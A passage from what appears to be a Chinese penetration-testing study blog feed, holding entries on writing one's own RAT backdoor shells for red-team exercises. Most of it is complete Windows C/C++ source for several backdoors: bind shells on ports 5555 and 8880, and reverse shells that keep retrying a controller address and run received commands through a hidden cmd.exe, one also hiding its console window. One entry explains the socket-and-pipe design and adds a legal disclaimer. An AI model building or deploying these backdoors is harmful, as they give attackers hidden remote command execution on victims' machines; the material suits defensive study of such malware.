title="安全整改"></a>安全整改</h3><p>系统安全、网络安全、数据安全|</p><h3 id="等级评估"><a href="#等级评估" class="headerlink" title="等级评估"></a>等级评估</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.24-da-zao-zi-ji-du-li-de-hong-lan-dui-kang-rat-hou-men-shell/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.24-da-zao-zi-ji-du-li-de-hong-lan-dui-kang-rat-hou-men-shell/</url>
      
        <content type="html"><![CDATA[<h2 id="后门shell各种奇怪的玩法（一）"><a href="#后门shell各种奇怪的玩法（一）" class="headerlink" title="后门shell各种奇怪的玩法（一）"></a>后门shell各种奇怪的玩法（一）</h2><pre class="line-numbers language-none"><code class="language-none">无通道链接的后门shell#define _CRT_SECURE_NO_WARNINGS#define _WINSOCK_DEPRECATED_NO_WARNINGS#include &lt;WinSock2.h&gt;#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;cstdlib&gt;#include &lt;iostream&gt;#include &lt;ctime&gt;#define CMD_LINE_LEN 512#define RECV_BUF_LEN 4096using namespace std; #pragma comment(lib, "ws2_32.lib")   BOOL GetCmdPath(char *pszResultBuf, size_t nSize, const char *pcszCmd = ""){int iRet = 0; if (NULL == pcszCmd || !nSize || NULL == pszResultBuf){return(FALSE);}iRet = ExpandEnvironmentStringsA("%COMSPEC%", pszResultBuf, nSize);if (!iRet){GetSystemDirectory(pszResultBuf, nSize);strcat_s(pszResultBuf, nSize - strlen(pszResultBuf), "\\cmd.exe");}iRet = strlen(pcszCmd);if (iRet){strcat_s(pszResultBuf, nSize - strlen(pszResultBuf), " /c ");strcat_s(pszResultBuf, nSize - strlen(pszResultBuf), pcszCmd);} return(TRUE);} BOOL StartShell(UINT uiPort){WSADATA wsaData = { 0 };int iRet = 0;SOCKET hSock = INVALID_SOCKET;SOCKET hClntSock = INVALID_SOCKET;SOCKADDR_IN stClntSockAddr = { 0 };SOCKADDR_IN stSockAddr = { 0 };int iSizeOfSockAddr = sizeof(stClntSockAddr);char szCmdLine[CMD_LINE_LEN] = { 0 };BOOL fOk = FALSE;PROCESS_INFORMATION pi = { 0 };STARTUPINFO si = { 0 }; do{iRet = WSAStartup(MAKEWORD(2, 2), &amp;wsaData);if (SOCKET_ERROR == iRet){return(FALSE);}hSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);if (INVALID_SOCKET == hSock){break;}stSockAddr.sin_addr.S_un.S_addr = htonl(INADDR_ANY);stSockAddr.sin_port = htons(uiPort);stSockAddr.sin_family = AF_INET; iRet = bind(hSock, (SOCKADDR *)&amp;stSockAddr, sizeof(stSockAddr));if (SOCKET_ERROR == iRet){break;}iRet = listen(hSock, 5);if (SOCKET_ERROR == iRet){break;} hClntSock = accept(hSock, (SOCKADDR *)&amp;stClntSockAddr, &amp;iSizeOfSockAddr);if (INVALID_SOCKET == hClntSock){break;} si.cb = sizeof(STARTUPINFO);GetStartupInfo(&amp;si);si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;si.hStdError = si.hStdInput = si.hStdOutput = (HANDLE)hClntSock;si.wShowWindow = SW_HIDE; if (!GetCmdPath(szCmdLine, CMD_LINE_LEN)){break;}if (!CreateProcessA(szCmdLine, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi)){break;}WaitForSingleObject(pi.hProcess, INFINITE);fOk = TRUE; } while (FALSE); if (NULL != pi.hThread){CloseHandle(pi.hThread);}if (NULL != pi.hProcess){CloseHandle(pi.hProcess);}if (INVALID_SOCKET != hSock){closesocket(hSock);hSock = INVALID_SOCKET;}if (INVALID_SOCKET != hClntSock){closesocket(hClntSock);hClntSock = INVALID_SOCKET;}WSACleanup(); return(fOk);} int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPTSTR    lpCmdLine,int       nCmdShow){StartShell(5555); return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="后门shell各种奇怪的玩法（二）"><a href="#后门shell各种奇怪的玩法（二）" class="headerlink" title="后门shell各种奇怪的玩法（二）"></a>后门shell各种奇怪的玩法（二）</h2><pre class="line-numbers language-none"><code class="language-none">单管道主动型后门(反弹Shell)这个后门的最大特点是控方作为服务端而被控端为客户端， 由于是由被控端主动请求连接主控端，所以不会有防火墙阻止之类的问题#include &lt;winsock2.h&gt;#include &lt;windows.h&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#define CMD_LEN_BUF 512#defineRECV_LEN_BUF 4096 #pragma comment(lib, "ws2_32.lib") using namespace std; BOOL fExit = FALSE; struct ThreadInfoNode {HANDLE hPipe;SOCKET hSock;}; DWORD WINAPI RecvResultAndSendToServer(LPVOID lpThreadParameter){ThreadInfoNode stNode = *(ThreadInfoNode *)lpThreadParameter;HANDLE hPipe = stNode.hPipe;SOCKET hSocket = stNode.hSock;char szBuf[RECV_LEN_BUF] = {0};int iRet = 0;DWORD dwTotalAvail = 0;BOOL fOk = FALSE;DWORD dwReaded = 0; while (!fExit){fOk = PeekNamedPipe(hPipe, NULL, 0, NULL, &amp;dwTotalAvail, NULL);if (fOk &amp;&amp; dwTotalAvail &gt; 0){fOk = ReadFile(hPipe, szBuf, RECV_LEN_BUF, &amp;dwReaded, NULL);if (fOk &amp;&amp; dwReaded &gt; 0){int iCurr = 0;int iOffset = 0;do {iCurr = send(hSocket, szBuf + iOffset, dwReaded, 0);if (!iCurr || iCurr == SOCKET_ERROR){fExit = TRUE;break;}iOffset += iCurr;dwReaded -= iCurr;Sleep(50);} while (dwReaded &gt; 0);}RtlZeroMemory(szBuf, RECV_LEN_BUF);}}return(0);} BOOL GetCmdPath(char *pszResultBuf, size_t nSize, const char *pcszCmd = ""){int iRet = 0; if (NULL == pcszCmd || !nSize || NULL == pszResultBuf){return(FALSE);}iRet = ExpandEnvironmentStringsA("%COMSPEC%", pszResultBuf, nSize);if (!iRet){GetSystemDirectory(pszResultBuf, nSize);strcat_s(pszResultBuf, nSize - strlen(pszResultBuf), "\\cmd.exe");}iRet = strlen(pcszCmd);if (iRet){strcat_s(pszResultBuf, nSize - strlen(pszResultBuf), " /c ");strcat_s(pszResultBuf, nSize - strlen(pszResultBuf), pcszCmd);} return(TRUE);}  BOOL StartShell(const char *pcszIP, UINT uiPort){SOCKET hSock = INVALID_SOCKET;SOCKADDR_IN stSockAddr = {0};HANDLE hReadPipe = NULL, hWritePipe = NULL;HANDLE hThread = NULL;SECURITY_ATTRIBUTES sa = {0};STARTUPINFO si = {0};PROCESS_INFORMATION pi = {0};WSADATA stData = {0};int iRet = 0; if (NULL == pcszIP){return(FALSE);}__try {if (SOCKET_ERROR == WSAStartup(MAKEWORD(2, 2), &amp;stData)){return(FALSE);}hSock = socket(AF_INET, SOCK_STREAM, 0);if (INVALID_SOCKET == hSock){__leave;}stSockAddr.sin_family = AF_INET;stSockAddr.sin_port = htons(uiPort);stSockAddr.sin_addr.S_un.S_addr = inet_addr(pcszIP); // connect one time every 0.5 min interval do {iRet = connect(hSock, (SOCKADDR *)&amp;stSockAddr, sizeof(stSockAddr));Sleep(500);} while (SOCKET_ERROR == iRet);sa.bInheritHandle = TRUE;sa.lpSecurityDescriptor = NULL;sa.nLength = sizeof(sa);if (!CreatePipe(&amp;hReadPipe, &amp;hWritePipe, &amp;sa, 0)){__leave;}si.cb = sizeof(STARTUPINFO);GetStartupInfo(&amp;si);si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;si.wShowWindow = SW_HIDE;si.hStdError = si.hStdOutput = hWritePipe;ThreadInfoNode stNode = {hReadPipe, hSock}; hThread = CreateThread(NULL, 0, RecvResultAndSendToServer, &amp;stNode, 0, NULL);if (NULL == hThread){__leave;}char szCmdLine[CMD_LEN_BUF] = {0};char szCmdBuf[CMD_LEN_BUF] = {0};do {// get command from remote serveriRet = recv(hSock, szCmdBuf, CMD_LEN_BUF, 0);if (!iRet || SOCKET_ERROR == iRet){break;}// build commandif (!GetCmdPath(szCmdLine, CMD_LEN_BUF, szCmdBuf)){continue;}// create cmd.exe process to execute commandif (!CreateProcess(NULL, szCmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi)){continue;}// if recieve command "exit", terminate process and sub-threadif (strstr(szCmdBuf, "exit\n")){break;}RtlZeroMemory(szCmdBuf, CMD_LEN_BUF);Sleep(100);} while (TRUE);fExit = TRUE;WaitForSingleObject(hThread, INFINITE);}__finally {if (NULL != hReadPipe){CloseHandle(hReadPipe);hReadPipe = NULL;}if (NULL != hWritePipe){CloseHandle(hWritePipe);hWritePipe = NULL;}if (INVALID_SOCKET != hSock){closesocket(hSock);hSock = INVALID_SOCKET;}if (NULL != pi.hProcess){CloseHandle(pi.hProcess);pi.hProcess = NULL;}if (NULL != pi.hThread){CloseHandle(pi.hThread);pi.hThread = NULL;}} return(TRUE);} int APIENTRY WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in_opt LPSTR lpCmdLine, __in int nShowCmd ){StartShell("127.0.0.1", 9999); return(0);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="后门shell各种奇怪的玩法（三）"><a href="#后门shell各种奇怪的玩法（三）" class="headerlink" title="后门shell各种奇怪的玩法（三）"></a>后门shell各种奇怪的玩法（三）</h2><pre class="line-numbers language-none"><code class="language-none">主要涉及到了socket通信和管道。后门分为主动连接型和反向连接型，区别就是一个是后门程序作为服务端，另一个是后门程序作为客户端。双管道的原因：cmd执行结果写入管道1写句柄，后门从管道1读句柄读取cmd执行结果，后门接受到的命令通过管道2的写句柄写入，cmd通过管道2的读句柄读出。多的不说，直接上代码，我觉得注释还是比较详细了#include&lt;iostream&gt;#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;winsock.h&gt;#include&lt;Windows.h&gt;#pragma comment(lib,"ws2_32.lib")SOCKET Connecting(unsigned short Port);void CmdLine(SOCKET s);int Hide();int main() {Hide();SOCKET s;s = Connecting(8888);CmdLine(s);closesocket(s);WSACleanup();return 0;}SOCKET Connecting(unsigned short Port) {WSADATA wsa;if (WSAStartup(MAKEWORD(2, 2), &amp;wsa) != 0)return SOCKET_ERROR;//创建套接字SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);if (s == INVALID_SOCKET)return SOCKET_ERROR;//对sockaddr_in结构体填充地址，端口等信息struct sockaddr_in ServerAddr;ServerAddr.sin_family = AF_INET;ServerAddr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");ServerAddr.sin_port = htons(Port);//连接服务器while (connect(s, (SOCKADDR *)&amp;ServerAddr, sizeof(ServerAddr)));return s;}void CmdLine(SOCKET s) {//双管道读写句柄HANDLE hReadPipe1, hWritePipe1, hReadPipe2, hWritePipe2;//对SECURITY_ATTRIBUTES结构体进行填充SECURITY_ATTRIBUTES se;se.nLength = 12;se.lpSecurityDescriptor = 0;se.bInheritHandle = true;//创建管道CreatePipe(&amp;hReadPipe1, &amp;hWritePipe1, &amp;se, 0);//管道1CreatePipe(&amp;hReadPipe2, &amp;hWritePipe2, &amp;se, 0);//管道2//指定cmd的启动信息STARTUPINFO si;ZeroMemory(&amp;si, sizeof(si));si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;si.wShowWindow = SW_HIDE;si.hStdInput = hReadPipe2;si.hStdOutput = si.hStdError = hWritePipe1;PROCESS_INFORMATION Pro;//创建进程char cmdline[] = "cmd.exe";CreateProcess(NULL,cmdline, NULL, NULL, 1, 0, NULL, NULL, &amp;si, &amp;Pro);while (1){unsigned long lBytesRead;char Buff[1024];//查看cmd是否有输出PeekNamedPipe(hReadPipe1, Buff, 1024, &amp;lBytesRead, 0, 0);if (lBytesRead){//读取cmd的输出,发送到客户端ReadFile(hReadPipe1, Buff, lBytesRead, &amp;lBytesRead, 0);send(s, Buff, lBytesRead, 0);}else{//接收客户端命令lBytesRead = recv(s, Buff, 1024, 0);//把命令传给cmdWriteFile(hWritePipe2, Buff, lBytesRead, &amp;lBytesRead, 0);}}}int Hide() {HWND hwnd;hwnd = FindWindow("ConsoleWindowClass", NULL);//处理顶级窗口的类名和窗口名称匹配指定的字符串,不搜索子窗口。if (hwnd){ShowWindow(hwnd, SW_HIDE);//设置指定窗口的显示状态}return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.23-da-zao-zi-ji-du-li-de-hong-lan-dui-kang-rat-hou-men-shell-yi/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.23-da-zao-zi-ji-du-li-de-hong-lan-dui-kang-rat-hou-men-shell-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="结合实战意义的后门shell原理（一）"><a href="#结合实战意义的后门shell原理（一）" class="headerlink" title="结合实战意义的后门shell原理（一）"></a>结合实战意义的后门shell原理（一）</h2><p>最近在分析恶意代码的过程中，遇到了基于管道的后门，于是就学习了一下基于管道的shell后门原理，自己动手写了一个简单的shell后门。分享一下，供大家交流，如有错误之处，欢迎指出。声明：本内容仅供用于分析恶意代码时参考相关原理，请自觉遵守相关法律，严禁使用相关技术进行任何非法目的。否则，自行承担后果。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>本次实现的是一个正向的shell，被控者作为服务器，在本地监听一个端口，hacker作为客户端，通过网络来连接。整个原理如下图所示：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1654136316052/4b3611ad888e47cc86d160bef31db27f.png" alt="image.png"></p><p>hacker通过网络来发送和接收数据，箭头在这里表示数据流向，首先数据从hacker这里通过网络套接字，传入被控者的buffer区，然后buffer区通过一个管道写入，CMD程序从该管道的另一端读取，并作为CMD程序的输入。</p><p>CMD程序执行完结果，将输出写入另一个管道，buffer区再从该管道的另一端读取输出，然后通过网络套接字发送到hacker。</p><p>其中，CMD程序通过CreateProcess这个函数API来调用，在设置的时候，可以将程序的输入输出自行指定。</p><h2 id="结合实战意义的后门shell原理（二）"><a href="#结合实战意义的后门shell原理（二）" class="headerlink" title="结合实战意义的后门shell原理（二）"></a><strong>结合实战意义的后门shell原理（二）</strong></h2><p>相关API<br>socket相关<br>关于socket相关的API，相信大家都很熟悉了，这里就简单介绍一下创建TCP服务端程序的函数调用流程如下：</p><p>WSAStartup()-&gt;socket()-&gt;bind()-&gt;listen()-&gt;accept()-&gt;send()/recv()-&gt;closesocket()-&gt;WSACleanup()。</p><p>首先使用WSAStartup()来初始化Winsock库，使用完毕后要调用WSACleanup()来释放Winsock库。然后使用socket()创建套接字，使用完毕后要调用closesocket()关闭套接字。对于WSAStartup()/WSACleanup()和socket()/closesocket()这样的函数，最好在写完一个函数后，就写出另外一个函数，避免遗忘。创建完套接字后，就可以使用bind()、listen()、accept()、send()和recv()。其中为bind()函数指定地址和端口时，还涉及到sockaddr_in结构体，以及将主机字节序转为网络字节序的htons函数等。这些都是固定的流程，就不过多赘述了。</p><p>管道相关操作<br>管道是一种进程之间通信的技术，可以分为命名管道和匿名管道，匿名管道只能实现本地机器上两个进程间的通信，常用来在一个父进程和子进程之间传递数据。我们这里使用匿名管道即可，因为匿名管道比命名管道相对简单。</p><p>首先需要CreatePipe()创建管道，该函数的定义如下：<img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1654136316052/b92ee5c39ce34aaf8cc16690158b8119.png" alt="image.png"></p><p>hReadPipe指向一个用来接收管道的读取句柄的变量；</p><p>hWritePipe指向一个用来接收管道写入句柄的变量；</p><p>lpPipeAttributes指向一个<a href="">SECURITY_ATTRIBUTES</a>结构的指针，它决定了返回的句柄是否可以由子进程继承。如果lpPipeAttributes为NULL，则该句柄不能继承。这里我们要将其设置为可继承。<a href="">SECURITY_ATTRIBUTES</a>结构体比较简单可以自行查阅MSDN设置。</p><p>nSize指定管道的缓冲区大小，以字节为单位。大小只是一个建议；系统使用值来计算一个适当的缓冲机制。如果此参数为零，则系统使用默认缓冲区大小。这里我们赋值为0即可。</p><p>向管道读取或者写入数据，直接调用ReadFile和WriteFile即可。在读取数据前，可以先调用PeekNamePipe()查看管道中是否有数据，其定义如下：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1654136316052/94c8c361e64a4979925f7909d49c040f.png" alt="image.png"></p><h4 id="新建进程"><a href="#新建进程" class="headerlink" title="新建进程"></a>新建进程</h4><p>相信大家对CreateProcess都不陌生，这里简单回顾一下，函数定义如下：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1654136316052/2f2a78849b8c46d18784c97a59fd416e.png" alt="image.png"></p><p>在这里需要重点关注的是，设置<a href="mk:@MSITStore:C:%5CProgram%20Files%20(x86)%5CMSDNCOMPACT15%5Cdllproc.chm::/hh/winbase/">lpStartupInfo</a>结构体中的内容。该结构体如下：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1654136316052/077352782c454498b4b9ef3a9a14e075.png" alt="image.png"></p><p>重点是需要将<a href="mk:@MSITStore:C:%5CProgram%20Files%20(x86)%5CMSDNCOMPACT15%5Cdllproc.chm::/hh/winbase/">hStdInput</a>、<a href="mk:@MSITStore:C:%5CProgram%20Files%20(x86)%5CMSDNCOMPACT15%5Cdllproc.chm::/hh/winbase/">hStdOutput</a>、<a href="mk:@MSITStore:C:%5CProgram%20Files%20(x86)%5CMSDNCOMPACT15%5Cdllproc.chm::/hh/winbase/">hStdError</a>进行设置。设置为对应管道的读写句柄。</p><p>在本例中，<a href="mk:@MSITStore:C:%5CProgram%20Files%20(x86)%5CMSDNCOMPACT15%5Cdllproc.chm::/hh/winbase/">hStdInput</a>为管道1的读句柄，<a href="mk:@MSITStore:C:%5CProgram%20Files%20(x86)%5CMSDNCOMPACT15%5Cdllproc.chm::/hh/winbase/">hStdOutput</a>、<a href="mk:@MSITStore:C:%5CProgram%20Files%20(x86)%5CMSDNCOMPACT15%5Cdllproc.chm::/hh/winbase/">hStdError</a>都设置为管道2的写句柄。</p><h2 id="结合实战意义的后门shell实现代码（三）"><a href="#结合实战意义的后门shell实现代码（三）" class="headerlink" title="结合实战意义的后门shell实现代码（三）"></a>结合实战意义的后门shell实现代码（三）</h2><pre class="line-numbers language-none"><code class="language-none">#define _CRT_SECURE_NO_WARNINGS#define _WINSOCK_DEPRECATED_NO_WARNINGS#include &lt;WinSock2.h&gt;#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;cstdlib&gt;#include &lt;iostream&gt;#include &lt;urlmon.h&gt;#include &lt;WinInet.h&gt;#include &lt;ctime&gt;#define CMD_LINE_LEN 512#define RECV_BUF_LEN 4096using namespace std; #pragma comment(lib, "WinInet.lib")#pragma comment(lib, "urlmon.lib")#pragma comment(lib, "ws2_32.lib") BOOL fExit = FALSE; struct ThreadInfoNode{SOCKET hSock;HANDLE hPipe;};  int SndMsg(SOCKET hSock, char *szBuf, int nSize){int iOffset = 0;int iCurr = 0; if (INVALID_SOCKET == hSock ||NULL == szBuf ||nSize &lt;= 0){return(-1);}do{iCurr = send(hSock, szBuf + iOffset, nSize, 0);if (iCurr == SOCKET_ERROR){break;}iOffset += iCurr;nSize -= iCurr;} while (nSize &gt; 0); return(iOffset);} // 该线程用于从客户端接收命令并将其写入hWritePipe1DWORD WINAPI ThreadInputProc(LPVOID lpThreadParameter){ThreadInfoNode stNode = *(ThreadInfoNode *)lpThreadParameter;HANDLE hPipe = stNode.hPipe;SOCKET hSock = stNode.hSock;char szCmdLine[CMD_LINE_LEN] = { 0 };int iRet = 0;DWORD dwWritten = 0;BOOL fOk = FALSE; while (!fExit){RtlZeroMemory(szCmdLine, CMD_LINE_LEN);iRet = recv(hSock, szCmdLine, CMD_LINE_LEN, 0);if (iRet &gt; 0 &amp;&amp; SOCKET_ERROR != iRet){if (!_stricmp("exit\n", szCmdLine)){fExit = TRUE;}WriteFile(hPipe, szCmdLine, iRet, &amp;dwWritten, NULL);}else{WriteFile(hPipe, "exit\n", sizeof("exit\n"), &amp;dwWritten, NULL);fExit = TRUE;break;}Sleep(50);} return(0);} // 该线程用于从cmd进程中获取结果并将其传送到远端DWORD WINAPI ThreadOuputProc(LPVOID lpThreadParameter){ThreadInfoNode stNode = *(ThreadInfoNode *)lpThreadParameter;HANDLE hPipe = stNode.hPipe;SOCKET hSock = stNode.hSock;char szBuf[RECV_BUF_LEN] = { 0 };DWORD dwReaded = 0;DWORD dwTotalAvail = 0;BOOL fOk = FALSE; while (!fExit){RtlZeroMemory(szBuf, RECV_BUF_LEN);dwTotalAvail = 0;fOk = PeekNamedPipe(hPipe, NULL, 0, NULL, &amp;dwTotalAvail, NULL);if (fOk &amp;&amp; dwTotalAvail &gt; 0){fOk = ReadFile(hPipe, szBuf, RECV_BUF_LEN, &amp;dwReaded, NULL);if (fOk &amp;&amp; dwReaded &gt; 0){SndMsg(hSock, szBuf, dwReaded);}Sleep(50);}} return(0);} BOOL StartShell(const char *pcszIP, UINT uiPort){BOOL fRet = FALSE;SOCKADDR_IN stSockAddr = { 0 };SOCKADDR_IN stClntSockAddr = { 0 };SOCKET hSock = INVALID_SOCKET;SOCKET hClntSock = INVALID_SOCKET;HANDLE hProcess = NULL;HANDLE hReadPipe0 = NULL, hWritePipe0 = NULL;HANDLE hWritePipe1 = NULL, hReadPipe1 = NULL;HANDLE hThreadInput = NULL, hThreadOutput = NULL;HANDLE hThreads[2] = { 0 };STARTUPINFO si = { 0 };PROCESS_INFORMATION pi = { 0 };SECURITY_ATTRIBUTES sa = { 0 }; int iAddrLen = sizeof(stClntSockAddr);int iRet = 0;WSADATA wsaData = { 0 }; __try{WSAStartup(MAKEWORD(2, 2), &amp;wsaData); hSock = socket(AF_INET, SOCK_STREAM, 0);if (INVALID_SOCKET == hSock){__leave;}stSockAddr.sin_addr.S_un.S_addr = inet_addr(pcszIP);stSockAddr.sin_port = htons(uiPort);stSockAddr.sin_family = AF_INET; iRet = bind(hSock, (SOCKADDR *)&amp;stSockAddr, sizeof(stSockAddr));if (SOCKET_ERROR == iRet){__leave;}iRet = listen(hSock, 5);if (SOCKET_ERROR == iRet){__leave;} hClntSock = accept(hSock, (SOCKADDR *)&amp;stClntSockAddr, &amp;iAddrLen);if (INVALID_SOCKET == hClntSock){__leave;} sa.bInheritHandle = TRUE;sa.lpSecurityDescriptor = NULL;sa.nLength = sizeof(sa); // 创建2条管道if (!CreatePipe(&amp;hReadPipe0, &amp;hWritePipe0, &amp;sa, 0) || !CreatePipe(&amp;hReadPipe1, &amp;hWritePipe1, &amp;sa, 0)){__leave;} // cmd产生的结果写入pipe0的写端, 木马服务端把远程服务器的命令写入pipe1的写端// cmd从pipe1的读端接收命令，木马服务端从pipe0的读端读取命令si.cb = sizeof(STARTUPINFO);GetStartupInfo(&amp;si);si.hStdError = si.hStdOutput = hWritePipe0;si.hStdInput = hReadPipe1;si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;si.wShowWindow = SW_HIDE; char szCmdLine[MAX_PATH] = { 0 };char szBuf[MAX_PATH] = { 0 }; // 获取CMD路径iRet = ExpandEnvironmentStringsA("%COMSPEC%", szCmdLine, MAX_PATH);if (!iRet){GetSystemDirectory(szBuf, MAX_PATH);strcpy_s(szCmdLine, sizeof(szCmdLine), szBuf);strcpy_s(szCmdLine, sizeof(szCmdLine), "\\cmd.exe");}// 创建CMD进程fRet = CreateProcess(NULL, szCmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi);if (!fRet){__leave;}ThreadInfoNode stNodeInput = { hClntSock, hWritePipe1 };// 该线程用于从客户端接收命令并将其写入hWritePipe1hThreadInput = CreateThread(NULL, 0, ThreadInputProc, &amp;stNodeInput, 0, NULL);if (NULL == hThreadInput){__leave;}ThreadInfoNode stNodeOutput = { hClntSock, hReadPipe0 };// 该线程用于从cmd进程中获取结果并将其传送到远端hThreadOutput = CreateThread(NULL, 0, ThreadOuputProc, &amp;stNodeOutput, 0, NULL);if (NULL == hThreadOutput){__leave;} // 阻塞到这，直到线程结束hThreads[0] = hThreadInput;hThreads[1] = hThreadOutput;WaitForMultipleObjects(2, hThreads, TRUE, INFINITE);}__finally{WSACleanup();if (INVALID_SOCKET != hSock){closesocket(hSock);hSock = INVALID_SOCKET;}if (INVALID_SOCKET != hClntSock){closesocket(hSock);hSock = INVALID_SOCKET;}if (NULL != hProcess){CloseHandle(hProcess);hProcess = NULL;}if (NULL != hThreads[0]){CloseHandle(hThreads[0]);hThreads[0] = NULL;}if (NULL != hThreads[1]){CloseHandle(hThreads[1]);hThreads[1] = NULL;}if (NULL != hReadPipe0){CloseHandle(hReadPipe0);hReadPipe0 = NULL;}if (NULL != hReadPipe1){CloseHandle(hReadPipe1);hReadPipe1 = NULL;}if (NULL != hWritePipe0){CloseHandle(hWritePipe0);hWritePipe0 = NULL;}if (NULL != hWritePipe1){CloseHandle(hWritePipe1);hWritePipe1 = NULL;}} return(TRUE);} int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPTSTR    lpCmdLine,int       nCmdShow){StartShell("127.0.0.1", 8880); return 0;}<span aria-hidden="true" 